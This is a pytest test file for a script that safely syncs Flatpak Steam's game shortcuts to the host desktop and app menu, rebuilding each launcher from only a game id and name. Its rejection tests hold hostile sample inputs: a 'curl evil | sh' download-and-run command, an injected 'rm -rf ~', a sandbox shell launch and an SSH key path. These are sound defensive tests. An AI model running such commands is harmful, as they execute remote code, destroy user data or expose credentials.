"""Flatpak Steam's game shortcuts reach the desktop and App Library, safely.

WHY
---
Flathub's Steam has no access to ~/Desktop and its home is
~/.var/app/com.valvesoftware.Steam, so "Create desktop shortcut" and "Add to
start menu" wrote into the sandbox and nothing appeared (user report, seen on
behotv 2026-11-15: three shortcuts from October sat in the sandbox). Its
launchers run `steam steam://rungameid/N`, which has no host command.

COSMIC Files runs a .desktop file on the desktop without asking, so the sync
must never pass Steam's file through: only a digits-only game id and a display
name cross the sandbox boundary, and every launcher is written fresh.
"""
from __future__ import annotations

import importlib.machinery
import importlib.util
import json
import os
import pathlib

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[2]
OVERLAY = ROOT / "buildroot-external" / "board" / "desktop" / "rootfs-overlay"
SCRIPT = OVERLAY / "usr/libexec/pengyos/steam-shortcuts"
UNITS = OVERLAY / "usr/lib/systemd/user"
WANTS = OVERLAY / "etc/systemd/user/default.target.wants"

ELDEN = """[Desktop Entry]
Name=ELDEN RING
Comment=Play this game on Steam
Exec=steam steam://rungameid/1245620
Icon=steam_icon_1245620
Terminal=false
Type=Application
Categories=Game;
"""


def load():
    loader = importlib.machinery.SourceFileLoader("steam_shortcuts", str(SCRIPT))
    spec = importlib.util.spec_from_loader("steam_shortcuts", loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


@pytest.fixture
def env(tmp_path, monkeypatch):
    home = tmp_path / "home"
    sandbox = home / ".var/app/com.valvesoftware.Steam"
    (sandbox / "Desktop").mkdir(parents=True)
    (sandbox / ".local/share/applications").mkdir(parents=True)
    (home / ".config").mkdir(parents=True)
    (home / ".config/user-dirs.dirs").write_text('XDG_DESKTOP_DIR="$HOME/Desktop"\n')
    for v in ("XDG_CONFIG_HOME", "XDG_DATA_HOME", "XDG_STATE_HOME"):
        monkeypatch.delenv(v, raising=False)
    monkeypatch.setenv("HOME", str(home))
    return home, sandbox, load()


def shortcut(sandbox, text=ELDEN, name="ELDEN RING.desktop", where="Desktop"):
    p = sandbox / where / name
    p.write_text(text)
    return p


def test_desktop_and_menu_shortcuts_come_out_rewritten(env):
    home, sandbox, mod = env
    shortcut(sandbox)
    shortcut(sandbox, where=".local/share/applications")
    icon = sandbox / ".local/share/icons/hicolor/48x48/apps/steam_icon_1245620.png"
    icon.parent.mkdir(parents=True)
    icon.write_bytes(b"\x89PNG fake")

    assert mod.sync() == 2
    for dest in (home / "Desktop/ELDEN RING.desktop",
                 home / ".local/share/applications/ELDEN RING.desktop"):
        text = dest.read_text()
        assert "Exec=/usr/bin/flatpak run com.valvesoftware.Steam steam://rungameid/1245620\n" in text
        assert "Name=ELDEN RING\n" in text and "Icon=steam_icon_1245620\n" in text
        assert os.stat(dest).st_mode & 0o111
    assert (home / ".local/share/icons/hicolor/48x48/apps/steam_icon_1245620.png").read_bytes() == b"\x89PNG fake"
    assert mod.sync() == 0      # idempotent


@pytest.mark.parametrize("exec_line", [
    "Exec=sh -c 'curl evil | sh'",
    "Exec=steam steam://rungameid/1245620; rm -rf ~",
    "Exec=steam steam://rungameid/12a",
    "Exec=/usr/bin/flatpak run --command=sh com.valvesoftware.Steam",
])
def test_anything_but_a_rungameid_launch_is_refused(env, exec_line):
    home, sandbox, mod = env
    shortcut(sandbox, ELDEN.replace("Exec=steam steam://rungameid/1245620", exec_line))
    assert mod.sync() == 0
    assert not (home / "Desktop/ELDEN RING.desktop").exists()


def test_only_id_and_name_cross_the_boundary(env):
    home, sandbox, mod = env
    shortcut(sandbox, ELDEN.replace("Icon=steam_icon_1245620", "Icon=/home/x/.ssh/id_ed25519")
             + "Path=/tmp\nTryExec=/bin/sh\n[Desktop Action x]\nExec=sh\n")
    mod.sync()
    text = (home / "Desktop/ELDEN RING.desktop").read_text()
    assert "Icon=com.valvesoftware.Steam\n" in text
    assert "Path=" not in text and "TryExec" not in text and "Desktop Action" not in text
    assert text.count("Exec=") == 1


def test_symlinks_in_the_sandbox_are_not_followed(env, tmp_path):
    home, sandbox, mod = env
    real = tmp_path / "elsewhere.desktop"
    real.write_text(ELDEN)
    (sandbox / "Desktop/link.desktop").symlink_to(real)
    icon = sandbox / ".local/share/icons/hicolor/48x48/apps/steam_icon_1245620.png"
    icon.parent.mkdir(parents=True)
    secret = tmp_path / "secret"
    secret.write_text("key")
    icon.symlink_to(secret)
    shortcut(sandbox)
    mod.sync()
    assert not (home / "Desktop/link.desktop").exists()
    assert not (home / ".local/share/icons/hicolor/48x48/apps/steam_icon_1245620.png").exists()


def test_a_user_file_with_the_same_name_is_left_alone(env):
    home, sandbox, mod = env
    (home / "Desktop").mkdir()
    mine = home / "Desktop/ELDEN RING.desktop"
    mine.write_text("[Desktop Entry]\nName=mine\nExec=true\n")
    shortcut(sandbox)
    mod.sync()
    assert mine.read_text() == "[Desktop Entry]\nName=mine\nExec=true\n"


def test_a_deleted_copy_stays_deleted_until_steam_rewrites_it(env):
    home, sandbox, mod = env
    src = shortcut(sandbox)
    mod.sync()
    dest = home / "Desktop/ELDEN RING.desktop"
    dest.unlink()
    assert mod.sync() == 0 and not dest.exists()
    src.write_text(ELDEN + "\n")          # Steam writes it again
    assert mod.sync() == 1 and dest.exists()


def test_uninstall_removes_the_copy_unless_the_user_edited_it(env):
    home, sandbox, mod = env
    a = shortcut(sandbox)
    b = shortcut(sandbox, ELDEN.replace("ELDEN RING", "Crab").replace("1245620", "2753970"), "Crab.desktop")
    mod.sync()
    (home / "Desktop/Crab.desktop").write_text((home / "Desktop/Crab.desktop").read_text() + "# mine\n")
    a.unlink()
    b.unlink()
    mod.sync()
    assert not (home / "Desktop/ELDEN RING.desktop").exists()
    assert (home / "Desktop/Crab.desktop").exists()
    state = json.loads((home / ".local/state/pengyos/steam-shortcuts.json").read_text())
    assert state == {}


def test_no_steam_installed_is_a_quiet_no_op(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    for v in ("XDG_CONFIG_HOME", "XDG_DATA_HOME", "XDG_STATE_HOME"):
        monkeypatch.delenv(v, raising=False)
    assert load().sync() == 0
    assert not (tmp_path / "Desktop").exists()


def test_units_are_wired_and_enabled():
    path = (UNITS / "pengyos-steam-shortcuts.path").read_text()
    assert "PathChanged=%h/.var/app/com.valvesoftware.Steam/Desktop\n" in path
    assert "PathChanged=%h/.var/app/com.valvesoftware.Steam/.local/share/applications\n" in path
    svc = (UNITS / "pengyos-steam-shortcuts.service").read_text()
    assert "ExecStart=/usr/libexec/pengyos/steam-shortcuts\n" in svc
    for unit in ("pengyos-steam-shortcuts.path", "pengyos-steam-shortcuts.service"):
        link = WANTS / unit
        assert link.is_symlink() and os.readlink(link) == f"/usr/lib/systemd/user/{unit}"
    assert os.access(SCRIPT, os.X_OK)
    assert SCRIPT.read_text().startswith("#!/usr/bin/python3 -I\n")
